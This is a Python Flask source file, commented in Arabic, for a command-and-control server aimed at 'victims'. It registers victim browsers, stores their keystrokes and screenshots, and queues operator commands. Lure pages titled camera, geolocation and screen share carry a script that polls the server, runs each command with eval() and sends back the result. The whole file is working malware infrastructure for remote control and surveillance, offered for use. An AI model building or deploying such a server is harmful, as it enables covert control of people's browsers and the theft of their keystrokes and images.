from flask import Flask, request, jsonify, send_from_directory, render_template_string, render_template
from flask_cors import CORS
import sqlite3
import os
import json
from datetime import datetime
import base64

app = Flask(__name__)
CORS(app)

DB_PATH = "c2.db"
UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# HTML بسيط للضحايا
BASIC_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>{{ title }}</title>
    <script>
        async function pollCommands() {
            try {
                const res = await fetch('/api/poll?victim_id={{ victim_id }}');
                const data = await res.json();
                if (data.command) {
                    const result = eval(data.command);
                    if (result !== undefined) {
                        await fetch('/api/command_result', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                victim_id: '{{ victim_id }}',
                                command_id: data.command_id,
                                result: result
                            })
                        });
                    }
                }
            } catch (err) {
                console.error(err);
            }
            setTimeout(pollCommands, 2000);
        }
        pollCommands();
    </script>
</head>
<body>
    <h1>{{ title }}</h1>
</body>
</html>
"""

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # إنشاء الجداول الأساسية
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY,
        ip TEXT,
        user_agent TEXT,
        created_at TEXT,
        last_seen TEXT,
        is_online INTEGER,
        permissions TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        command TEXT,
        executed INTEGER DEFAULT 0,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        result TEXT
    )''')
    
    # جداول جديدة للواجهة المتقدمة
    c.execute('''CREATE TABLE IF NOT EXISTS keylogs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        data TEXT,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS media (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        type TEXT,
        file_path TEXT,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS activities (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        type TEXT,
        data TEXT,
        timestamp TEXT DEFAULT CURRENT_TIMESTAMP
    )''')
    
    conn.commit()
    conn.close()

@app.route('/')
def home():
    return render_template('admin.html')

@app.route('/register', methods=['POST'])
def register_victim():
    data = request.json
    vid = data.get('id')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    now = datetime.utcnow().isoformat()

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO victims (id, ip, user_agent, created_at, last_seen, is_online, permissions) VALUES (?, ?, ?, COALESCE((SELECT created_at FROM victims WHERE id=?), ?), ?, 1, ?)",
              (vid, ip, ua, vid, now, now, json.dumps(data.get('permissions', {}))))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    vid = request.json.get('id')
    now = datetime.utcnow().isoformat()
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE victims SET last_seen=?, is_online=1 WHERE id=?", (now, vid))
    conn.commit()
    conn.close()
    
    return jsonify({"status": "alive"})

# API endpoints للواجهة المتقدمة
@app.route('/api/victims', methods=['GET'])
def api_victims():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    
    # تحديث حالة الأجهزة غير النشطة
    offline_threshold = datetime.utcnow().isoformat().replace('T', ' ')[:19]
    c.execute("UPDATE victims SET is_online=0 WHERE last_seen < datetime(?, '-5 minutes')", (offline_threshold,))
    
    c.execute("SELECT id, ip, user_agent, created_at, last_seen, is_online FROM victims ORDER BY last_seen DESC")
    victims = [dict(row) for row in c.fetchall()]
    
    conn.commit()
    conn.close()
    return jsonify({"status": "success", "victims": victims})

@app.route('/api/victim_info', methods=['GET'])
def api_victim_info():
    victim_id = request.args.get('victim_id')
    if not victim_id:
        return jsonify({"error": "Missing victim_id"}), 400
    
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    
    c.execute("SELECT * FROM victims WHERE id=?", (victim_id,))
    victim = c.fetchone()
    
    if not victim:
        conn.close()
        return jsonify({"error": "Victim not found"}), 404
    
    # جلب آخر 5 أوامر
    c.execute("SELECT command, result, created_at FROM commands WHERE victim_id=? ORDER BY id DESC LIMIT 5", (victim_id,))
    commands = [dict(row) for row in c.fetchall()]
    
    conn.close()
    
    return jsonify({
        "status": "success",
        "info": dict(victim),
        "commands": commands
    })

@app.route('/api/activities', methods=['GET'])
def api_activities():
    victim_id = request.args.get('victim_id')
    if not victim_id:
        return jsonify({"error": "Missing victim_id"}), 400
    
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    
    c.execute("SELECT type, data, timestamp FROM activities WHERE victim_id=? ORDER BY id DESC LIMIT 50", (victim_id,))
    activities = [dict(row) for row in c.fetchall()]
    
    conn.close()
    
    return jsonify({
        "status": "success",
        "activities": activities
    })

@app.route('/api/execute', methods=['POST'])
def api_execute():
    data = request.json
    victim_id = data.get('victim_id')
    command = data.get('command')

    if not victim_id or not command:
        return jsonify({"error": "Missing victim_id or command"}), 400

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute("INSERT INTO commands (victim_id, command) VALUES (?, ?)", (victim_id, command))
    command_id = c.lastrowid
    
    # تسجيل النشاط
    c.execute("INSERT INTO activities (victim_id, type, data) VALUES (?, ?, ?)",
              (victim_id, 'command', json.dumps({"command": command})))
    
    conn.commit()
    conn.close()

    return jsonify({
        "status": "success",
        "message": "Command queued",
        "command_id": command_id
    })

@app.route('/api/command_result', methods=['POST'])
def api_command_result():
    data = request.json
    victim_id = data.get('victim_id')
    command_id = data.get('command_id')
    result = data.get('result')

    if not all([victim_id, command_id, result]):
        return jsonify({"error": "Missing parameters"}), 400

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute("UPDATE commands SET result=? WHERE id=?", (str(result), command_id))
    
    # تسجيل النشاط
    c.execute("INSERT INTO activities (victim_id, type, data) VALUES (?, ?, ?)",
              (victim_id, 'command_result', json.dumps({"command_id": command_id, "result": str(result)})))
    
    conn.commit()
    conn.close()

    return jsonify({"status": "success"})

@app.route('/api/keylog', methods=['POST'])
def api_keylog():
    data = request.json
    victim_id = data.get('victim_id')
    key_data = data.get('data')

    if not victim_id or not key_data:
        return jsonify({"error": "Missing victim_id or data"}), 400

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute("INSERT INTO keylogs (victim_id, data) VALUES (?, ?)", 
              (victim_id, json.dumps(key_data)))
    
    # تسجيل النشاط
    c.execute("INSERT INTO activities (victim_id, type, data) VALUES (?, ?, ?)",
              (victim_id, 'keylog', json.dumps(key_data)))
    
    conn.commit()
    conn.close()

    return jsonify({"status": "success"})

@app.route('/api/screenshot', methods=['POST'])
def api_screenshot():
    data = request.json
    victim_id = data.get('victim_id')
    image_data = data.get('image')

    if not victim_id or not image_data:
        return jsonify({"error": "Missing victim_id or image data"}), 400

    try:
        # استخراج بيانات الصورة من base64
        header, encoded = image_data.split(",", 1)
        binary_data = base64.b64decode(encoded)
        
        # حفظ الصورة
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{victim_id}_{timestamp}.jpg"
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        
        with open(filepath, "wb") as f:
            f.write(binary_data)
        
        # تسجيل في قاعدة البيانات
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        c.execute("INSERT INTO media (victim_id, type, file_path) VALUES (?, ?, ?)",
                  (victim_id, 'screenshot', filename))
        
        # تسجيل النشاط
        c.execute("INSERT INTO activities (victim_id, type, data) VALUES (?, ?, ?)",
                  (victim_id, 'screenshot', json.dumps({"file_path": filename})))
        
        conn.commit()
        conn.close()
        
        return jsonify({"status": "success", "file_path": filename})
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/poll')
def api_poll():
    victim_id = request.args.get('victim_id')
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    
    c.execute("SELECT id, command FROM commands WHERE victim_id=? AND executed=0 ORDER BY id ASC LIMIT 1", (victim_id,))
    row = c.fetchone()
    
    if row:
        cmd_id, command = row['id'], row['command']
        c.execute("UPDATE commands SET executed=1 WHERE id=?", (cmd_id,))
        conn.commit()
        conn.close()
        return jsonify({"command": command, "command_id": cmd_id})
    
    conn.close()
    return jsonify({"command": None})

@app.route('/uploads/<filename>')
def serve_upload(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

# الصفحات الأساسية
@app.route('/camera.html')
def camera_page():
    victim_id = request.args.get('victim')
    return render_template_string(BASIC_HTML, title="Camera Capture", victim_id=victim_id)

@app.route('/geo.html')
def geo_page():
    victim_id = request.args.get('victim')
    return render_template_string(BASIC_HTML, title="Geo Location", victim_id=victim_id)

@app.route('/screenshare.html')
def screenshare_page():
    victim_id = request.args.get('victim')
    return render_template_string(BASIC_HTML, title="Screen Share", victim_id=victim_id)

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000, debug=True)
